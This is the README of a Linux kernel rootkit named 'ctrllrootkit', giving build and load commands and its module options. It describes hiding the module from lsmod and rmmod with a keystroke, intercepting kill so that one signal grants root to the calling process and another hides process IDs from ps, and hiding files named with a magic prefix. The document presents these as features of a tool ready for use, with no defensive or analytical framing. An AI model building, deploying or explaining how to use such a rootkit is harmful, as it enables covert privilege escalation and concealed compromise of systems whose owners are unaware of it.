# ctrllrootkit
## Building & Loading/Unloading
build with
```
make all
```
load with
```
insmod ctrll.ko <options>
```
where options are:
* debug=(0-2) 
  * 0 = off
  * 1 = normal
  * 2 = extra 
* hideonload=(0-1)
  * 0 = off
  * 1 = on
  
## Hiding/Unhiding
Hide/Unhide rootkit from lsmod/rmmod by pressing CTRL-L three times. 
Note: can't remove rootkit with rmmod if it is hidden.

## Kill interception
* kill -64 <any PID> gives root to calling process
* kill -63 <PID> hides PID from 'ps' command
  
## Hiding files/directories
files starting with MAGIC_PREFIX (see ctrll.h) will be hidden from ls 
